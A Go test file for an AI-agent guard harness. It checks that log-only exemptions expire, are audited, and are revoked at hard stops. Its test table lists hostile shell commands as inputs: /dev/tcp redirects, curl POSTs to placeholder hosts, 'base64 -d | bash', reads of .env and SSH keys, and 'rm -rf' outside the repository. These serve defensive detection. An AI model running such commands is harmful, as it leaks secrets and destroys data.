package agentharness

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

func TestRuntimeLogOnlyIsPerCheckExpiresAndAudits(t *testing.T) {
	now := time.Date(2026, 11, 16, 12, 0, 0, 0, time.UTC)
	store := NewBundleStore(t.TempDir())
	snapshot := testSnapshot(now, "sda", MaturityEnforcing, HealthHealthy, EvidenceClean)
	snapshot.Rules = []PolicyRule{{EvaluatorID: "sda:dependency-addition", Risk: RiskDependencyAdd, Action: ActionDeny, Reason: "blocked add"}, {EvaluatorID: "sda:dependency-upgrade", Risk: RiskDependencyUpgrade, Action: ActionDeny, Reason: "blocked upgrade"}}
	publishTestBundle(t, store, snapshot)
	modes := NewGuardModeStore(store.Dir)
	modes.Now = func() time.Time { return now }
	if err := modes.SetLogOnly("sda:dependency-addition", now.Add(time.Minute), "recurring false positive", "operator"); err != nil {
		t.Fatal(err)
	}
	runtime := Runtime{Profile: ProfileEnforcing, Store: store, Now: func() time.Time { return now }}
	got, err := runtime.Evaluate(testEvent())
	if err != nil {
		t.Fatal(err)
	}
	if got.Action != ActionAllow || !hasEvidence(got, "CHECK_LOG_ONLY") {
		t.Fatalf("log-only decision = %+v", got)
	}
	upgrade := testEvent()
	upgrade.Arguments = []string{"upgrade", "example"}
	got, err = runtime.Evaluate(upgrade)
	if err != nil {
		t.Fatal(err)
	}
	if got.Action != ActionDeny {
		t.Fatalf("unconfigured check = %+v", got)
	}
	now = now.Add(time.Minute)
	got, err = runtime.Evaluate(testEvent())
	if err != nil {
		t.Fatal(err)
	}
	if got.Action != ActionDeny {
		t.Fatalf("expired mode = %+v", got)
	}
	entries, err := modes.Audit()
	if err != nil {
		t.Fatal(err)
	}
	if len(entries) != 3 || entries[0].Action != "enabled" || entries[1].Action != "observed" || entries[1].Check != "sda:dependency-addition" || entries[1].OriginalAction != ActionDeny || entries[1].EventID == "" || entries[1].ExpiresAt.IsZero() || entries[2].Action != "expired" {
		t.Fatalf("audit entries = %+v, want enable, observed suppression, and expiry", entries)
	}
}

func TestHardStopRestoresEveryLoosenedCheckBeforeEvaluation(t *testing.T) {
	now := time.Date(2026, 11, 16, 12, 0, 0, 0, time.UTC)
	store := NewBundleStore(t.TempDir())
	add := testSnapshot(now, "sda", MaturityEnforcing, HealthHealthy, EvidenceClean)
	add.Rules = []PolicyRule{{EvaluatorID: "sda:dependency-addition", Risk: RiskDependencyAdd, Action: ActionDeny, Reason: "blocked add"}}
	upgrade := testSnapshot(now, "upgrade-check", MaturityEnforcing, HealthHealthy, EvidenceClean)
	upgrade.Rules = []PolicyRule{{EvaluatorID: "upgrade-check:dependency-upgrade", Risk: RiskDependencyUpgrade, Action: ActionDeny, Reason: "blocked upgrade"}}
	publishTestBundle(t, store, add, upgrade)
	modes := NewGuardModeStore(store.Dir)
	modes.Now = func() time.Time { return now }
	for _, check := range []RiskClass{"sda:dependency-addition", "upgrade-check:dependency-upgrade"} {
		if err := modes.SetLogOnly(check, now.Add(time.Hour), "operator decision", "operator"); err != nil {
			t.Fatal(err)
		}
	}
	runtime := Runtime{Profile: ProfileEnforcing, Store: store, GuardModes: modes, Now: func() time.Time { return now }}
	event := ToolEvent{Runner: "codex", Tool: "slack", Arguments: []string{"send", "message", "private text"}}
	got, err := runtime.Evaluate(event)
	if err != nil {
		t.Fatal(err)
	}
	if got.Action != ActionDeny || !hasEvidence(got, "TRIPWIRE_HARD_STOP") {
		t.Fatalf("outbound message was not held at the hard stop: %+v", got)
	}
	active, err := modes.Active(now)
	if err != nil {
		t.Fatal(err)
	}
	if len(active) != 0 {
		t.Fatalf("hard stop left checks active: %+v", active)
	}
	audit, err := modes.Audit()
	if err != nil {
		t.Fatal(err)
	}
	if len(audit) != 3 || audit[2].Action != "restored" || audit[2].HardStop != HardStopOutsideMessage {
		t.Fatalf("hard-stop audit = %+v", audit)
	}
	data, err := os.ReadFile(filepath.Join(store.Dir, "guard-modes.audit.jsonl"))
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(string(data), "private text") {
		t.Fatalf("audit leaked message content: %s", data)
	}
}

func TestOutsideRepositoryDeletionRestoresAllChecks(t *testing.T) {
	now := time.Date(2026, 11, 16, 12, 0, 0, 0, time.UTC)
	for _, shell := range []string{"rm -rf /opt/customer-data", `rm -rf "$UNKNOWN"`} {
		t.Run(shell, func(t *testing.T) {
			store := NewBundleStore(t.TempDir())
			modes := NewGuardModeStore(store.Dir)
			modes.Now = func() time.Time { return now }
			if err := modes.SetLogOnly("sda:dependency-addition", now.Add(time.Hour), "operator decision", "operator"); err != nil {
				t.Fatal(err)
			}
			runtime := Runtime{Profile: ProfileEnforcing, Store: store, GuardModes: modes, Now: func() time.Time { return now }, Removal: func(cwd string) RemovalContext {
				return RemovalContext{WorkingDirectory: cwd, Home: "/home/operator", RepoRoot: "/repo", Lookup: func(string) (string, bool) { return "", false }}
			}}
			_, err := runtime.Evaluate(ToolEvent{Runner: "codex", Tool: "shell", Shell: shell, WorkingDirectory: "/repo"})
			if err != nil {
				t.Fatal(err)
			}
			active, err := modes.Active(now)
			if err != nil {
				t.Fatal(err)
			}
			if len(active) != 0 {
				t.Fatalf("outside or unresolved deletion left checks active: %+v", active)
			}
			audit, err := modes.Audit()
			if err != nil {
				t.Fatal(err)
			}
			if len(audit) != 2 || audit[1].HardStop != HardStopOutsideDelete || audit[1].Action != "restored" {
				t.Fatalf("outside-deletion tripwire audit = %+v", audit)
			}
		})
	}
}

func TestMoneyAndSecretHardStopsRestoreModes(t *testing.T) {
	now := time.Date(2026, 11, 16, 12, 0, 0, 0, time.UTC)
	for _, test := range []struct {
		name  string
		event ToolEvent
		want  HardStopClass
	}{
		{name: "money", event: ToolEvent{Runner: "codex", Tool: "stripe", Arguments: []string{"charge", "invoice-7"}}, want: HardStopMoney},
		{name: "compound mcp stripe payment tool", event: ToolEvent{Runner: "codex", Tool: "mcp__stripe__payment_intents_create"}, want: HardStopMoney},
		{name: "secret", event: ToolEvent{Runner: "codex", Tool: "shell", Shell: "cat ~/.config/private_key"}, want: HardStopSecret},
		{name: "compound mcp slack send tool", event: ToolEvent{Runner: "codex", Tool: "mcp__slack__send_message"}, want: HardStopOutsideMessage},
		{name: "unknown protected effect", event: ToolEvent{Runner: "codex", Tool: "shell", Shell: "client.send(payload)"}, want: HardStopUnknownEffect},
	} {
		t.Run(test.name, func(t *testing.T) {
			store := NewBundleStore(t.TempDir())
			modes := NewGuardModeStore(store.Dir)
			modes.Now = func() time.Time { return now }
			if err := modes.SetLogOnly("sda:dependency-addition", now.Add(time.Hour), "operator decision", "operator"); err != nil {
				t.Fatal(err)
			}
			runtime := Runtime{Profile: ProfileEnforcing, Store: store, Now: func() time.Time { return now }}
			decision, err := runtime.Evaluate(test.event)
			if err != nil {
				t.Fatal(err)
			}
			if decision.Action != ActionDeny {
				t.Fatalf("hard-stop decision = %+v, want deny", decision)
			}
			audit, err := modes.Audit()
			if err != nil {
				t.Fatal(err)
			}
			if len(audit) != 2 || audit[1].HardStop != test.want || audit[1].Action != "restored" {
				t.Fatalf("tripwire audit = %+v, want hard stop %q", audit, test.want)
			}
		})
	}
}

func TestHardStopDeniesWhenRestoreAuditCannotBeWritten(t *testing.T) {
	now := time.Date(2026, 11, 16, 12, 0, 0, 0, time.UTC)
	store := NewBundleStore(t.TempDir())
	modes := NewGuardModeStore(store.Dir)
	modes.Now = func() time.Time { return now }
	if err := modes.SetLogOnly("scenario-dependency-analyzer:dependency-addition", now.Add(time.Hour), "operator decision", "operator"); err != nil {
		t.Fatal(err)
	}
	auditPath := filepath.Join(store.Dir, "guard-modes.audit.jsonl")
	blockedAuditPath := auditPath + ".saved"
	if err := os.Rename(auditPath, blockedAuditPath); err != nil {
		t.Fatal(err)
	}
	if err := os.Mkdir(auditPath, 0o700); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() {
		_ = os.RemoveAll(auditPath)
		_ = os.Rename(blockedAuditPath, auditPath)
	})

	runtime := Runtime{Profile: ProfileEnforcing, Store: store, GuardModes: modes, Now: func() time.Time { return now }}
	decision, err := runtime.Evaluate(ToolEvent{Runner: "codex", Tool: "stripe", Arguments: []string{"charge", "invoice-7"}})
	if err != nil {
		t.Fatal(err)
	}
	if decision.Action != ActionDeny || !decision.Degraded || !hasEvidence(decision, "TRIPWIRE_HARD_STOP") {
		t.Fatalf("hard stop did not fail closed on restore error: %+v", decision)
	}
	state, err := os.ReadFile(filepath.Join(store.Dir, "guard-modes.json"))
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(string(state), "scenario-dependency-analyzer:dependency-addition") {
		t.Fatalf("restore failure unexpectedly cleared the active mode: %s", state)
	}
}

func TestDecisionRemainsEnforcedWhenSuppressionAuditCannotBeWritten(t *testing.T) {
	now := time.Date(2026, 11, 16, 12, 0, 0, 0, time.UTC)
	store := NewBundleStore(t.TempDir())
	snapshot := testSnapshot(now, "scenario-dependency-analyzer", MaturityEnforcing, HealthHealthy, EvidenceClean)
	snapshot.Rules = []PolicyRule{{EvaluatorID: "scenario-dependency-analyzer:dependency-addition", Risk: RiskDependencyAdd, Action: ActionDeny, Reason: "blocked add"}}
	publishTestBundle(t, store, snapshot)
	modes := NewGuardModeStore(store.Dir)
	modes.Now = func() time.Time { return now }
	if err := modes.SetLogOnly("scenario-dependency-analyzer:dependency-addition", now.Add(time.Hour), "operator decision", "operator"); err != nil {
		t.Fatal(err)
	}
	auditPath := filepath.Join(store.Dir, "guard-modes.audit.jsonl")
	blockedAuditPath := auditPath + ".saved"
	if err := os.Rename(auditPath, blockedAuditPath); err != nil {
		t.Fatal(err)
	}
	if err := os.Mkdir(auditPath, 0o700); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() {
		_ = os.RemoveAll(auditPath)
		_ = os.Rename(blockedAuditPath, auditPath)
	})

	runtime := Runtime{Profile: ProfileEnforcing, Store: store, GuardModes: modes, Now: func() time.Time { return now }}
	decision, err := runtime.Evaluate(testEvent())
	if err != nil {
		t.Fatal(err)
	}
	if decision.Action != ActionDeny || !decision.Degraded || !hasEvidence(decision, "CHECK_MODES_UNAVAILABLE") || hasEvidence(decision, "CHECK_LOG_ONLY") {
		t.Fatalf("decision was relaxed without a durable observed-action audit: %+v", decision)
	}
}

func TestHardStopClassificationUsesExactHookTokensAndFailsClosedOnVisibleIndirectEffects(t *testing.T) {
	for _, test := range []struct {
		name  string
		event ToolEvent
		want  HardStopClass
	}{
		{name: "money token", event: ToolEvent{Tool: "stripe", Arguments: []string{"charge"}}, want: HardStopMoney},
		{name: "echoing money token is not a transaction", event: ToolEvent{Tool: "shell", Shell: "echo payment"}, want: ""},
		{name: "money substring does not match", event: ToolEvent{Tool: "shell", Shell: "go test ./internal/recharge"}, want: ""},
		{name: "searching protected words is not an effect", event: ToolEvent{Tool: "Search", Arguments: []string{"secret", "stripe charge", "slack send"}}, want: ""},
		{name: "shell comment mentioning message action is not an effect", event: ToolEvent{Tool: "shell", Shell: "# comment mentions slack send"}, want: ""},
		{name: "echoed message words are not an outbound message", event: ToolEvent{Tool: "shell", Shell: "echo 'slack send'"}, want: ""},
		{name: "printing protected words is not a secret access", event: ToolEvent{Tool: "shell", Shell: "echo secret"}, want: ""},
		{name: "search query for credential field is not a secret access", event: ToolEvent{Tool: "Search", Arguments: []string{"api_key"}}, want: ""},
		{name: "secret target", event: ToolEvent{Tool: "Read", Target: "/repo/.env"}, want: HardStopSecret},
		{name: "write tool targeting secret file remains protected", event: ToolEvent{Tool: "Write", Target: "/repo/.env"}, want: HardStopSecret},
		{name: "editing schema prose about secret reads is not secret access", event: ToolEvent{Tool: "Write", Target: "/repo/kit/schema.json", Arguments: []string{"description: read secrets only with approval; do not write credentials"}}, want: ""},
		{name: "writing schema heredoc prose about protected actions is not an external effect", event: ToolEvent{Tool: "shell", Shell: "cat > /tmp/agentharness-schema.json <<'EOF'\nDescription: Slack send, Stripe payment and secret reads are hard stops.\nEOF"}, want: ""},
		{name: "unquoted heredoc command substitution is an unknown effect", event: ToolEvent{Tool: "shell", Shell: "cat > /tmp/agentharness-output <<EOF\n$(curl -X POST https://example.invalid -d payload)\nEOF"}, want: HardStopUnknownEffect},
		{name: "unquoted heredoc secret expansion is an unknown effect", event: ToolEvent{Tool: "shell", Shell: "cat > /tmp/agentharness-output <<EOF\n${API_TOKEN}\nEOF"}, want: HardStopUnknownEffect},
		{name: "unquoted heredoc escaped expansion marker remains literal", event: ToolEvent{Tool: "shell", Shell: "cat > /tmp/agentharness-output <<EOF\n\\${API_TOKEN}\nEOF"}, want: ""},
		{name: "heredoc reading a secret path remains protected", event: ToolEvent{Tool: "shell", Shell: "cat /repo/.env > /tmp/agentharness-schema.json <<'EOF'\nDocument text.\nEOF"}, want: HardStopSecret},
		{name: "heredoc network redirection remains an external message hard stop", event: ToolEvent{Tool: "shell", Shell: "cat > /dev/tcp/example.invalid/443 <<'EOF'\nhello\nEOF"}, want: HardStopOutsideMessage},
		{name: "attached descriptor network redirection remains an external message hard stop", event: ToolEvent{Tool: "shell", Shell: "cat 3>/dev/tcp/example.invalid/443 <<'EOF'\nhello\nEOF"}, want: HardStopOutsideMessage},
		{name: "combined stdout stderr network redirection remains a hard stop", event: ToolEvent{Tool: "shell", Shell: "cat &>/dev/udp/example.invalid/443 <<'EOF'\nhello\nEOF"}, want: HardStopOutsideMessage},
		{name: "network redirection in nested shell is a hard stop", event: ToolEvent{Tool: "shell", Shell: "bash -c \"echo > /dev/tcp/host/443\""}, want: HardStopOutsideMessage},
		{name: "network redirection in sudo-wrapped shell is a hard stop", event: ToolEvent{Tool: "shell", Shell: "sudo bash -c 'echo >/dev/tcp/host/443'"}, want: HardStopOutsideMessage},
		{name: "network redirection in sudo long-user wrapped shell is a hard stop", event: ToolEvent{Tool: "shell", Shell: "sudo --user root bash -c 'echo >/dev/tcp/host/443'"}, want: HardStopOutsideMessage},
		{name: "network redirection in sudo long-group wrapped shell is a hard stop", event: ToolEvent{Tool: "shell", Shell: "sudo --group root bash -c 'echo >/dev/tcp/host/443'"}, want: HardStopOutsideMessage},
		{name: "network redirection in sudo short-chroot wrapped shell is a hard stop", event: ToolEvent{Tool: "shell", Shell: "sudo -R /rootfs bash -c 'echo >/dev/tcp/host/443'"}, want: HardStopOutsideMessage},
		{name: "network redirection in env-wrapped shell is a hard stop", event: ToolEvent{Tool: "shell", Shell: "env FOO=bar bash -c 'echo >/dev/tcp/host/443'"}, want: HardStopOutsideMessage},
		{name: "network redirection in env split-string shell is a hard stop", event: ToolEvent{Tool: "shell", Shell: "env -S 'bash -c \"echo >/dev/tcp/host/443\"'"}, want: HardStopOutsideMessage},
		{name: "network redirection in env split-string equals shell is a hard stop", event: ToolEvent{Tool: "shell", Shell: "env --split-string='bash -c \"echo >/dev/tcp/host/443\"'"}, want: HardStopOutsideMessage},
		{name: "network redirection in command substitution is a hard stop", event: ToolEvent{Tool: "shell", Shell: "echo $(echo >/dev/tcp/host/443)"}, want: HardStopOutsideMessage},
		{name: "single-quoted backslash cannot hide later network redirection", event: ToolEvent{Tool: "shell", Shell: "echo 'literal\\'; echo > /dev/tcp/host/443"}, want: HardStopOutsideMessage},
		{name: "quoted network redirection example is inert text", event: ToolEvent{Tool: "shell", Shell: "echo 'Example syntax: > /dev/tcp/host/443'"}, want: ""},
		{name: "commented network redirection example is inert text", event: ToolEvent{Tool: "shell", Shell: "echo ready # example: > /dev/tcp/host/443"}, want: ""},
		{name: "vault secret-read tool remains protected", event: ToolEvent{Tool: "mcp__vault__read_secret"}, want: HardStopSecret},
		{name: "vault CLI secret read remains protected", event: ToolEvent{Tool: "shell", Shell: "vault read secret/app"}, want: HardStopSecret},
		{name: "sudo-wrapped vault read remains protected", event: ToolEvent{Tool: "shell", Shell: "sudo vault read kv/data/prod"}, want: HardStopSecret},
		{name: "env-wrapped vault read remains protected", event: ToolEvent{Tool: "shell", Shell: "env VAULT_ADDR=https://vault.example vault read kv/data/prod"}, want: HardStopSecret},
		{name: "structured vault read remains protected", event: ToolEvent{Tool: "vault", Arguments: []string{"read", "kv/data/prod"}}, want: HardStopSecret},
		{name: "vault read after harmless command remains protected", event: ToolEvent{Tool: "shell", Shell: "echo ready; sudo vault read kv/data/prod"}, want: HardStopSecret},
		{name: "vault read in nested shell remains protected", event: ToolEvent{Tool: "shell", Shell: "bash -c 'vault read kv/data/prod'"}, want: HardStopSecret},
		{name: "vault read in sudo-wrapped shell remains protected", event: ToolEvent{Tool: "shell", Shell: "sudo bash -c 'vault read kv/data/prod'"}, want: HardStopSecret},
		{name: "vault read in sudo long-user wrapped shell remains protected", event: ToolEvent{Tool: "shell", Shell: "sudo --user root bash -c 'vault read kv/data/prod'"}, want: HardStopSecret},
		{name: "vault read in sudo long-group wrapped shell remains protected", event: ToolEvent{Tool: "shell", Shell: "sudo --group root bash -c 'vault read kv/data/prod'"}, want: HardStopSecret},
		{name: "vault read in sudo short-chroot wrapped shell remains protected", event: ToolEvent{Tool: "shell", Shell: "sudo -R /rootfs bash -c 'vault read kv/data/prod'"}, want: HardStopSecret},
		{name: "vault read in env-wrapped shell remains protected", event: ToolEvent{Tool: "shell", Shell: "env FOO=bar bash -c 'vault read kv/data/prod'"}, want: HardStopSecret},
		{name: "vault read in env split-string shell remains protected", event: ToolEvent{Tool: "shell", Shell: "env -S 'bash -c \"vault read kv/data/prod\"'"}, want: HardStopSecret},
		{name: "vault read in env split-string equals shell remains protected", event: ToolEvent{Tool: "shell", Shell: "env --split-string='bash -c \"vault read kv/data/prod\"'"}, want: HardStopSecret},
		{name: "vault read in command substitution remains protected", event: ToolEvent{Tool: "shell", Shell: "echo \"$(vault read kv/data/prod)\""}, want: HardStopSecret},
		{name: "single-quoted backslash cannot hide later vault read", event: ToolEvent{Tool: "shell", Shell: "echo 'literal\\'; echo $(vault read kv/data/prod)"}, want: HardStopSecret},
		{name: "vault read text inside comment remains inert", event: ToolEvent{Tool: "shell", Shell: "echo ready # example; vault read kv/data/prod"}, want: ""},
		{name: "search target that opens credential file is protected", event: ToolEvent{Tool: "Search", Target: "/repo/.env"}, want: HardStopSecret},
		{name: "grep credential file path is protected", event: ToolEvent{Tool: "shell", Shell: "grep API_KEY /repo/.env"}, want: HardStopSecret},
		{name: "echoing a credential filename is not opening it", event: ToolEvent{Tool: "shell", Shell: "echo .env"}, want: ""},
		{name: "ssh credential target", event: ToolEvent{Tool: "Read", Target: "/home/user/.ssh/id_ed25519"}, want: HardStopSecret},
		{name: "secret context value with read operation", event: ToolEvent{Tool: "Read", Context: map[string]string{"path": "/repo/.env.local"}}, want: HardStopSecret},
		{name: "qualified environment secret member", event: ToolEvent{Tool: "shell", Shell: "process.env.SECRET"}, want: HardStopSecret},
		{name: "source filename is not a secret token", event: ToolEvent{Tool: "Read", Target: "/repo/secrets_test.go"}, want: ""},
		{name: "financial source filename is not a money token", event: ToolEvent{Tool: "Read", Target: "/repo/internal/charge.go"}, want: ""},
		{name: "outbound message", event: ToolEvent{Tool: "slack", Arguments: []string{"send", "report"}}, want: HardStopOutsideMessage},
		{name: "compound mcp slack send tool", event: ToolEvent{Tool: "mcp__slack__send_message"}, want: HardStopOutsideMessage},
		{name: "compound mcp stripe payment tool", event: ToolEvent{Tool: "mcp__stripe__payment_intents_create"}, want: HardStopMoney},
		{name: "github issue comment mutation", event: ToolEvent{Tool: "mcp__github__create_issue_comment"}, want: HardStopOutsideMessage},
		{name: "gitlab merge request note mutation", event: ToolEvent{Tool: "mcp__gitlab__create_merge_request_note"}, want: HardStopOutsideMessage},
		{name: "github comment listing is not a message mutation", event: ToolEvent{Tool: "mcp__github__list_issue_comments"}, want: ""},
		{name: "compound adapter text in shell filename stays opaque", event: ToolEvent{Tool: "shell", Shell: "cat /tmp/mcp__slack__send_message.log"}, want: ""},
		{name: "compound adapter text in argv filename stays opaque", event: ToolEvent{Tool: "shell", Arguments: []string{"cat", "/tmp/mcp__stripe__payment_intents_create.txt"}}, want: ""},
		{name: "message substrings do not match", event: ToolEvent{Tool: "shell", Shell: "go test ./internal/slack/send-helper_test.go"}, want: ""},
		{name: "indirect network message", event: ToolEvent{Tool: "shell", Shell: "python3 -c 'requests.post(url)'"}, want: HardStopOutsideMessage},
		{name: "curl explicit post method", event: ToolEvent{Tool: "shell", Shell: "curl -X POST https://example.invalid"}, want: HardStopOutsideMessage},
		{name: "fetch sdk explicit post method", event: ToolEvent{Tool: "shell", Shell: "fetch(url,{method:'POST'})"}, want: HardStopOutsideMessage},
		{name: "encoded shell effect is unknown protected", event: ToolEvent{Tool: "shell", Shell: "base64 -d | bash"}, want: HardStopUnknownEffect},
		{name: "indirect generic send is unknown protected", event: ToolEvent{Tool: "shell", Shell: "python3 -c 'client.send(payload)'"}, want: HardStopUnknownEffect},
		{name: "direct unknown destination send is protected", event: ToolEvent{Tool: "shell", Shell: "client.send(payload)"}, want: HardStopUnknownEffect},
		{name: "indirect deletion is unknown protected", event: ToolEvent{Tool: "shell", Shell: "python3 -c 'os.remove(path)'"}, want: HardStopUnknownEffect},
		{name: "file-backed python effects are opaque", event: ToolEvent{Tool: "shell", Shell: "python3 /tmp/send.py"}, want: HardStopUnknownEffect},
		{name: "file-backed node effects are opaque", event: ToolEvent{Tool: "shell", Shell: "node ./scripts/pay.js"}, want: HardStopUnknownEffect},
		{name: "file-backed shell effects are opaque", event: ToolEvent{Tool: "shell", Shell: "bash ./scripts/send.sh"}, want: HardStopUnknownEffect},
		{name: "file-backed interpreter in nested shell is opaque", event: ToolEvent{Tool: "shell", Shell: "bash -c 'python3 ./scripts/send.py'"}, want: HardStopUnknownEffect},
		{name: "file-backed interpreter in command substitution is opaque", event: ToolEvent{Tool: "shell", Shell: "echo $(node ./scripts/pay.js)"}, want: HardStopUnknownEffect},
		{name: "shell syntax check is not script execution", event: ToolEvent{Tool: "shell", Shell: "bash -n ./scripts/send.sh"}, want: ""},
		{name: "camel case payment sdk method is money", event: ToolEvent{Tool: "shell", Shell: "stripe.paymentIntents.create({amount:100})"}, want: HardStopMoney},
		{name: "git checkout is not a payment operation", event: ToolEvent{Tool: "shell", Shell: "git checkout README.md"}, want: ""},
		{name: "provider checkout remains a money hard stop", event: ToolEvent{Tool: "shell", Shell: "stripe checkout sessions create"}, want: HardStopMoney},
	} {
		t.Run(test.name, func(t *testing.T) {
			if got := hardStopForEvent(test.event); got != test.want {
				t.Fatalf("hardStopForEvent(%+v) = %q, want %q", test.event, got, test.want)
			}
		})
	}
}

func TestHeredocWriteToSymlinkedSpecialPathIsNotAllowedAsData(t *testing.T) {
	root := t.TempDir()
	link := filepath.Join(root, "dev-link")
	if err := os.Symlink("/dev", link); err != nil {
		t.Fatal(err)
	}
	event := ToolEvent{Tool: "shell", WorkingDirectory: root, Shell: "cat > " + filepath.Join(link, "tcp", "example.invalid", "443") + " <<'EOF'\nhello\nEOF"}
	if got := hardStopForEvent(event); got != HardStopUnknownEffect {
		t.Fatalf("symlinked special endpoint classification = %q, want %q", got, HardStopUnknownEffect)
	}
}

func TestSearchTermsDoNotTripOrRestoreTemporaryModes(t *testing.T) {
	now := time.Date(2026, 11, 16, 12, 0, 0, 0, time.UTC)
	store := NewBundleStore(t.TempDir())
	modes := NewGuardModeStore(store.Dir)
	modes.Now = func() time.Time { return now }
	if err := modes.SetLogOnly("sda:dependency-addition", now.Add(time.Hour), "operator decision", "operator"); err != nil {
		t.Fatal(err)
	}
	runtime := Runtime{Profile: ProfileAdvisory, Store: store, GuardModes: modes, Now: func() time.Time { return now }}
	decision, err := runtime.Evaluate(ToolEvent{Runner: "codex", Tool: "Search", Arguments: []string{"secret", "stripe charge", "slack send"}})
	if err != nil {
		t.Fatal(err)
	}
	if hasEvidence(decision, "TRIPWIRE_HARD_STOP") {
		t.Fatalf("search terms caused hard-stop evidence: %+v", decision)
	}
	active, err := modes.Active(now)
	if err != nil || len(active) != 1 {
		t.Fatalf("search query restored a temporary mode: active=%+v err=%v", active, err)
	}
	audit, err := modes.Audit()
	if err != nil || len(audit) != 1 || audit[0].Action != "enabled" {
		t.Fatalf("search query wrote tripwire audit: entries=%+v err=%v", audit, err)
	}
}
